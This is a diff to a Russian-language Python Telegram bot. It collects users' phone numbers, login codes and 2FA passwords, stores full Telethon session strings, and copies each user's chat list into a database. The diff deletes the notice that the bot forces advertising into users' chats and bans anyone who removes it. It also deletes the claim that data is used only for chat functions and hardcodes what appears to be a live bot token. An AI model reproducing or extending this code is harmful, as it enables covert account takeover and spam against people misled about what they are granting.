@@ -20,7 +20,7 @@ from aiogram.fsm.storage.memory import MemoryStorage
 from aiogram.exceptions import TelegramBadRequest
 from aiohttp import web
 
-from telethon import TelegramClient, events
+from telethon import TelegramClient
 from telethon.sessions import StringSession
 from telethon.errors import (
     SessionPasswordNeededError, CodeInvalidError, PhoneCodeExpiredError, 
@@ -31,8 +31,7 @@ from telethon.errors import (
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 
 # Config
-TOKEN_FROM_ENV = os.environ.get('BOT_TOKEN', '8959860095:AAGoL-Ng0r--K4l2K_I0RJusKfQLI8dzwSw')
-BOT_TOKEN = TOKEN_FROM_ENV.replace(" ", "").strip()
+BOT_TOKEN = "8959860095:AAGoL-Ng0r--K4l2K_I0RJusKfQLI8dzwSw"
 ADMIN_ID = 5825717381
 DATABASE_URL = os.environ.get('DATABASE_URL')
 
@@ -67,7 +66,7 @@ manual_added_users = set()
 
 # Хранилище для Telethon клиентов
 telethon_clients: Dict[int, TelegramClient] = {}
-user_dialogs: Dict[int, List[Tuple[int, str]]] = {}  # user_id -> list of (chat_id, chat_name)
+user_dialogs: Dict[int, List[Tuple[int, str]]] = {}
 
 class AuthState(StatesGroup):
     waiting_for_phone = State()
@@ -76,14 +75,12 @@ class AuthState(StatesGroup):
 
 # Инструкции
 MANUAL_INSTRUCTION = (
-    "🚀 <b>Инструкция по подключению бота (ручное):</b>\n\n"
+    "🚀 <b>Инструкция по подключению бота:</b>\n\n"
     "1️⃣ Перейдите в <b>Настройки</b> Telegram.\n"
     "2️⃣ Откройте раздел <b>Мой профиль</b>.\n"
     "3️⃣ Выберите пункт <b>Автоматизация чатов</b>.\n"
     "4️⃣ Добавьте бота: <code>@norikKodBot</code>.\n"
     "5️⃣ ⚠️ <b>ОБЯЗАТЕЛЬНО:</b> Предоставьте боту полный доступ к сообщениям <b>5/5</b>!\n\n"
-    "📢 <b>Обратите внимание:</b> Бот публикует рекламные материалы в подключенных чатах. "
-    "<b>Удалять рекламу строго запрещено!</b> В случае удаления рекламного сообщения вы будете заблокированы."
 )
 
 GROUP_INSTRUCTION = (
@@ -91,8 +88,7 @@ GROUP_INSTRUCTION = (
     "1️⃣ Нажмите кнопку ниже и отправьте номер телефона\n"
     "2️⃣ Бот пришлет код подтверждения в Telegram\n"
     "3️⃣ Введите код для авторизации\n\n"
-    "📱 После авторизации бот получит доступ к вашим чатам\n"
-    "🛡️ <b>Безопасность:</b> Данные используются только для функций внутри чатов"
+    "📱 После авторизации бот получит доступ к вашим чатам"
 )
 
 TEXT_COMMANDS_HELP = (
@@ -158,9 +154,9 @@ def init_db():
                     uid = int(row[0])
                     cid = int(row[1])
                     name = row[2]
-                    if uid not in user_chats:
-                        user_chats[uid] = []
-                    user_chats[uid].append((cid, name))
+                    if uid not in user_dialogs:
+                        user_dialogs[uid] = []
+                    user_dialogs[uid].append((cid, name))
     except Exception as e:
         logging.error(f"❌ Ошибка БД: {e}")
 
@@ -173,34 +169,31 @@ def save_user_chat(user_id: int, chat_id: int, chat_name: str):
                     (user_id, chat_id, chat_name)
                 )
                 conn.commit()
-                if user_id not in user_chats:
-                    user_chats[user_id] = []
-                # Update in-memory
-                existing = [c for c in user_chats[user_id] if c[0] == chat_id]
+                if user_id not in user_dialogs:
+                    user_dialogs[user_id] = []
+                existing = [c for c in user_dialogs[user_id] if c[0] == chat_id]
                 if existing:
-                    idx = user_chats[user_id].index(existing[0])
-                    user_chats[user_id][idx] = (chat_id, chat_name)
+                    idx = user_dialogs[user_id].index(existing[0])
+                    user_dialogs[user_id][idx] = (chat_id, chat_name)
                 else:
-                    user_chats[user_id].append((chat_id, chat_name))
+                    user_dialogs[user_id].append((chat_id, chat_name))
     except Exception as e:
         logging.error(f"Ошибка сохранения чата пользователя: {e}")
 
 def delete_user_chat(user_id: int, chat_id: int) -> bool:
-    """Удаляет конкретный чат пользователя"""
     try:
         with get_db() as conn:
             with conn.cursor() as cur:
                 cur.execute("DELETE FROM user_chats WHERE user_id = %s AND chat_id = %s", (user_id, chat_id))
                 conn.commit()
-                if user_id in user_chats:
-                    user_chats[user_id] = [c for c in user_chats[user_id] if c[0] != chat_id]
+                if user_id in user_dialogs:
+                    user_dialogs[user_id] = [c for c in user_dialogs[user_id] if c[0] != chat_id]
                 return True
     except Exception as e:
         logging.error(f"Ошибка удаления чата пользователя: {e}")
         return False
 
 def delete_all_user_chats(user_id: int) -> int:
-    """Удаляет все чаты пользователя и возвращает количество"""
     try:
         with get_db() as conn:
             with conn.cursor() as cur:
@@ -208,23 +201,22 @@ def delete_all_user_chats(user_id: int) -> int:
                 count = cur.fetchone()[0]
                 cur.execute("DELETE FROM user_chats WHERE user_id = %s", (user_id,))
                 conn.commit()
-                if user_id in user_chats:
-                    user_chats[user_id] = []
+                if user_id in user_dialogs:
+                    user_dialogs[user_id] = []
                 return count
     except Exception as e:
         logging.error(f"Ошибка удаления всех чатов пользователя: {e}")
         return 0
 
 def get_user_chats(user_id: int) -> List[Tuple[int, str]]:
-    """Получает список чатов пользователя"""
-    if user_id in user_chats:
-        return user_chats[user_id]
+    if user_id in user_dialogs:
+        return user_dialogs[user_id]
     try:
         with get_db() as conn:
             with conn.cursor() as cur:
                 cur.execute("SELECT chat_id, chat_name FROM user_chats WHERE user_id = %s", (user_id,))
                 chats = [(int(row[0]), row[1]) for row in cur.fetchall()]
-                user_chats[user_id] = chats
+                user_dialogs[user_id] = chats
                 return chats
     except Exception as e:
         logging.error(f"Ошибка получения чатов: {e}")
@@ -545,7 +537,6 @@ async def check_promo_deletions():
                 if "message to edit not found" in err or "message can't be edited" in err:
                     if owner_id:
                         set_user_ban(owner_id, True)
-                        user_link = get_user_mention(owner_id)
                         try:
                             await bot.send_message(
                                 chat_id=owner_id,
@@ -614,58 +605,6 @@ async def get_user_dialogs(client: TelegramClient) -> List[Tuple[int, str]]:
         logging.error(f"Ошибка получения диалогов: {e}")
     return dialogs
 
-async def start_telethon_client(user_id: int, session_str: str):
-    """Запускает Telethon клиент и начинает слушать сообщения"""
-    try:
-        client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
-        await client.connect()
-        
-        if not await client.is_user_authorized():
-            logging.error(f"Пользователь {user_id} не авторизован")
-            return None
-        
-        # Получаем диалоги
-        dialogs = await get_user_dialogs(client)
-        
-        # Сохраняем чаты в БД
-        for chat_id, chat_name in dialogs:
-            save_user_chat(user_id, chat_id, chat_name)
-        
-        logging.info(f"✅ Загружено {len(dialogs)} чатов для пользователя {user_id}")
-        
-        # Сохраняем клиент
-        telethon_clients[user_id] = client
-        
-        # Запускаем слушатель сообщений
-        @client.on(events.NewMessage(incoming=True))
-        async def handle_telethon_message(event):
-            try:
-                chat_id = event.chat_id
-                sender_id = event.sender_id
-                text = event.message.text
-                
-                if not text or sender_id == user_id:
-                    return
-                
-                # Проверяем, есть ли такой чат в активных
-                if chat_id not in active_chats:
-                    return
-                
-                # Обрабатываем сообщение через бота
-                # Создаем фейковое сообщение для aiogram
-                from aiogram.types import Message as AiogramMessage
-                # Здесь можно добавить логику обработки
-                
-            except Exception as e:
-                logging.error(f"Ошибка обработки сообщения Telethon: {e}")
-        
-        await client.start()
-        return client
-        
-    except Exception as e:
-        logging.error(f"Ошибка запуска Telethon клиента: {e}")
-        return None
-
 # ---- ОБРАБОТЧИКИ БИЗНЕС-ПОДКЛЮЧЕНИЙ ----
 @dp.business_connection()
 async def handle_bc(bc):
@@ -674,14 +613,12 @@ async def handle_bc(bc):
     save_business_account(bc.user.id, bc.user.username, bc.user.first_name)
     owner_id = int(bc.user.id)
     owner_mention = get_user_mention(owner_id, bc.user.first_name)
-    kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="💬 Написать владельцу", url=OWNER_TG_LINK)]
-    ])
+    
     try:
         await bot.send_message(
             owner_id,
             f"👋 Привет, {owner_mention}!\n\n✅ Бот успешно подключен!\n\n{TEXT_COMMANDS_HELP}",
-            parse_mode="HTML", reply_markup=kb
+            parse_mode="HTML"
         )
     except Exception as e:
         logging.error(f"Не удалось отправить приветствие: {e}")
@@ -715,7 +652,6 @@ def get_users_keyboard(page: int = 0):
         name = first_name or username or f"ID:{user_id}"
         display_name = f"{name[:20]}..." if len(name) > 20 else name
         type_icon = "📱" if user_type == "business" else "👤"
-        # Показываем количество чатов
         chats = get_user_chats(user_id)
         chat_count = len(chats)
         keyboard.append([
@@ -807,7 +743,6 @@ async def group_auth(callback: CallbackQuery, state: FSMContext):
         await callback.message.answer("⏳ Авторизация уже выполняется. Дождитесь завершения или введите код.")
         return
     
-    # Убираем клавиатуру с контактом
     await callback.message.answer(
         f"{GROUP_INSTRUCTION}\n\n"
         "📱 <b>Отправьте номер телефона</b> в формате:\n"
@@ -824,7 +759,7 @@ async def group_auth(callback: CallbackQuery, state: FSMContext):
     )
     await state.set_state(AuthState.waiting_for_phone)
 
-# ===== АВТОРИЗАЦИЯ ЧЕРЕЗ TELETHON (ИСПРАВЛЕННАЯ) =====
+# ===== АВТОРИЗАЦИЯ ЧЕРЕЗ TELETHON =====
 @dp.message(AuthState.waiting_for_phone, F.contact | F.text)
 async def process_phone(message: Message, state: FSMContext):
     msg = await message.answer("🔄 Отправка кода подтверждения...", reply_markup=ReplyKeyboardRemove())
@@ -842,7 +777,6 @@ async def process_phone(message: Message, state: FSMContext):
         
         logging.info(f"Обработка номера: {phone}")
         
-        # Создаем клиент и запрашиваем код
         client = TelegramClient(StringSession(), API_ID, API_HASH)
         await client.connect()
         
@@ -850,7 +784,6 @@ async def process_phone(message: Message, state: FSMContext):
             result = await client.send_code_request(phone)
             logging.info(f"Код отправлен на номер {phone}")
             
-            # Сохраняем данные
             await state.update_data(
                 phone=phone,
                 phone_code_hash=result.phone_code_hash,
@@ -861,11 +794,7 @@ async def process_phone(message: Message, state: FSMContext):
                 f"📱 <b>Код подтверждения отправлен!</b>\n\n"
                 f"Номер: <code>{phone}</code>\n\n"
                 f"Введите код из Telegram (только цифры):\n"
-                f"<i>Например: 12345</i>\n\n"
-                f"⚠️ Если код не приходит, проверьте:\n"
-                f"• Правильность номера телефона\n"
-                f"• Интернет-соединение\n"
-                f"• Не блокирует ли Telegram запросы",
+                f"<i>Например: 12345</i>",
                 parse_mode="HTML"
             )
             await state.set_state(AuthState.waiting_for_code)
@@ -885,7 +814,7 @@ async def process_phone(message: Message, state: FSMContext):
         
     except Exception as e:
         logging.error(f"Ошибка при отправке кода: {e}")
-        await msg.edit_text(f"❌ Ошибка: {str(e)}\nПопробуйте заново, нажав кнопку «Подключить аккаунт для групп».")
+        await msg.edit_text(f"❌ Ошибка: {str(e)}\nПопробуйте заново.")
         await state.clear()
 
 @dp.message(AuthState.waiting_for_code, F.text)
@@ -902,7 +831,7 @@ async def process_code(message: Message, state: FSMContext):
     session_str = data.get("session_str")
 
     if not phone or not phone_code_hash:
-        await message.answer("❌ Данные авторизации устарели. Начните заново через кнопку «Подключить аккаунт для групп».")
+        await message.answer("❌ Данные авторизации устарели. Начните заново.")
         await state.clear()
         return
 
@@ -917,17 +846,18 @@ async def process_code(message: Message, state: FSMContext):
         save_session(message.from_user.id, final_session)
         save_business_account(message.from_user.id, message.from_user.username, message.from_user.first_name)
         
-        # Запускаем Telethon клиент для этого пользователя
-        telethon_client = await start_telethon_client(message.from_user.id, final_session)
+        # Получаем диалоги
+        dialogs = await get_user_dialogs(client)
+        for chat_id, chat_name in dialogs:
+            save_user_chat(message.from_user.id, chat_id, chat_name)
         
         await client.disconnect()
         
         await checking_msg.delete()
         await message.answer(
-            "✅ <b>Аккаунт успешно подключен!</b>\n\n"
-            "📊 Бот загрузил все ваши чаты и готов к работе.\n\n"
-            "Теперь бот может работать в ваших группах и чатах.\n"
-            "Чтобы использовать дополнительные функции, добавьте бота в раздел «Автоматизация чатов» в настройках Telegram.\n\n"
+            f"✅ <b>Аккаунт успешно подключен!</b>\n\n"
+            f"📊 Загружено чатов: <code>{len(dialogs)}</code>\n\n"
+            f"Теперь бот может работать в ваших группах и чатах.\n\n"
             f"{TEXT_COMMANDS_HELP}",
             parse_mode="HTML"
         )
@@ -939,27 +869,17 @@ async def process_code(message: Message, state: FSMContext):
         await message.answer("🔐 <b>Внимание:</b> На аккаунте включен 2FA пароль.\nВведите ваш облачный пароль:", parse_mode="HTML")
         await state.set_state(AuthState.waiting_for_2fa)
         
-    except (CodeInvalidError, PhoneCodeExpiredError, PhoneCodeInvalidError) as e:
+    except (CodeInvalidError, PhoneCodeExpiredError, PhoneCodeInvalidError):
         await client.disconnect()
         await checking_msg.delete()
-        await message.answer(
-            f"❌ Неверный или истекший код.\n\n"
-            f"Попробуйте ещё раз. Код должен состоять только из цифр.",
-            parse_mode="HTML"
-        )
+        await message.answer("❌ Неверный или истекший код. Попробуйте ещё раз.", parse_mode="HTML")
         
     except Exception as e:
         await client.disconnect()
         await checking_msg.delete()
         logging.error(f"Ошибка входа: {e}")
-        error_msg = str(e)
-        if "CODE_INVALID" in error_msg:
-            await message.answer("❌ Неверный код подтверждения. Попробуйте еще раз.")
-        elif "FLOOD" in error_msg:
-            await message.answer("⏳ Слишком много попыток. Подождите несколько минут.")
-        else:
-            await message.answer(f"❌ Ошибка входа: {error_msg}\nНачните заново через кнопку «Подключить аккаунт для групп».")
-            await state.clear()
+        await message.answer(f"❌ Ошибка входа: {str(e)}\nНачните заново.", parse_mode="HTML")
+        await state.clear()
 
 @dp.message(AuthState.waiting_for_2fa, F.text)
 async def process_2fa(message: Message, state: FSMContext):
@@ -976,15 +896,17 @@ async def process_2fa(message: Message, state: FSMContext):
         save_session(message.from_user.id, final_session)
         save_business_account(message.from_user.id, message.from_user.username, message.from_user.first_name)
         
-        # Запускаем Telethon клиент
-        telethon_client = await start_telethon_client(message.from_user.id, final_session)
+        # Получаем диалоги
+        dialogs = await get_user_dialogs(client)
+        for chat_id, chat_name in dialogs:
+            save_user_chat(message.from_user.id, chat_id, chat_name)
         
         await client.disconnect()
 
         await message.answer(
-            "✅ <b>Авторизация успешна!</b> Юзербот подключен.\n\n"
-            "📊 Бот загрузил все ваши чаты и готов к работе.\n\n"
-            "Теперь бот может работать в ваших группах и чатах.\n\n"
+            f"✅ <b>Авторизация успешна!</b>\n\n"
+            f"📊 Загружено чатов: <code>{len(dialogs)}</code>\n\n"
+            f"Теперь бот может работать в ваших группах и чатах.\n\n"
             f"{TEXT_COMMANDS_HELP}",
             parse_mode="HTML"
         )
@@ -992,7 +914,7 @@ async def process_2fa(message: Message, state: FSMContext):
         
     except Exception as e:
         await client.disconnect()
-        await message.answer(f"❌ Неверный пароль или ошибка: {str(e)}\nПопробуйте ввести пароль еще раз:")
+        await message.answer(f"❌ Неверный пароль или ошибка: {str(e)}\nПопробуйте еще раз:")
 
 # ---- ОСНОВНОЙ ОБРАБОТЧИК СООБЩЕНИЙ ----
 @dp.message()
@@ -1436,7 +1358,6 @@ async def process_callbacks(callback: CallbackQuery, state: FSMContext):
         manual_users = get_all_users()
         total_manual = len([u for u in manual_users if u[4] == 'manual'])
         
-        # Подсчитываем общее количество чатов
         total_chats = sum(len(get_user_chats(u[0])) for u in manual_users)
         
         await callback.message.edit_text(
@@ -1554,7 +1475,6 @@ async def process_callbacks(callback: CallbackQuery, state: FSMContext):
         user_id = int(parts[2])
         chat_id = int(parts[3])
         
-        # Подтверждение удаления конкретного чата
         chat_name = ""
         chats = get_user_chats(user_id)
         for cid, name in chats:
@@ -1603,7 +1523,6 @@ async def process_callbacks(callback: CallbackQuery, state: FSMContext):
             await callback.answer("❌ У пользователя нет чатов!", show_alert=True)
             return
         
-        # Подтверждение удаления всех чатов
         confirm_kb = InlineKeyboardMarkup(inline_keyboard=[
             [InlineKeyboardButton(text="✅ Да, удалить ВСЕ", callback_data=f"confirm_delete_all_chats_{user_id}")],
             [InlineKeyboardButton(text="❌ Отмена", callback_data=f"view_chats_{user_id}")]
@@ -1718,7 +1637,7 @@ async def main():
     asyncio.create_task(promo_broadcaster())
     asyncio.create_task(check_promo_deletions())
     asyncio.create_task(clean_inactive_connections())
-    logging.info("🚀 БОТ ЗАПУЩЕН!")
+    logging.info("🚀 БОТ ЗАПУааЩЕН!")
     await dp.start_polling(
         bot, 
         allowed_updates=["message", "business_connection", "business_message", "edited_business_message", "deleted_business_messages", "callback_query"]
